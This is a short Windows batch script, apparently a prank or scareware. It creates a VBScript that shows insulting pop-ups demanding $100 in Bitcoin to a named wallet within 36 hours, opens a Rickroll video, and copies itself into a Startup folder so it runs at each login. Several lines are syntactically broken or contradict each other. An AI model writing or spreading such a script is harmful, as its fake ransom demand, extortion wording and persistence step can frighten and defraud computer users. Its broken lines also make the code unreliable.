@echo off
::failsave
move 
if %username%==Guus0 GOTO :end
if %username%==Joopc GOTO :end
::make dir and files
md "C:\mini
echo x=msgbox("You have too many cookies" ,0, "Fat fuck")>"C:\mini\msg.vbs
echo y=msgbox("This message has VERY IMPORTANT INFORMATION" ,0, "Fat fuck")>>"C:\mini\msg.vbs"
echo a=msgbox("To save your pc..." ,0, "Hackmsg")>>"C:\mini\msg.vbs"
echo b=msgbox("Send $100 worth of Bitcoin" ,0, "SEND BTC")>>"C:\mini\msg.vbs"
echo c=msgbox("To wallet 3EC6xfP7fnrz8er5WBtp1q6Q7Rw3krNhZ6" ,0, "BTC FOR ME")>>"C:\mini\msg.vbs"
echo d=msgbox("When done, your pc will be saved" ,0, "YOU HAVE LOST!")>>"C:\mini\msg.vbs"
echo e=msgbox("You have 36 hours starting NOW" ,0, "POWER IS MINE!!!!")>>"C:\mini\msg.vbs"
start cscript "C:\mini\msg.vbs"
set url="https://www.youtube.com/watch?v=dQw4w9WgXcQ"
start chrome.exe %url%
move "%~f0" "C:\Users\Guus0\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\"

:end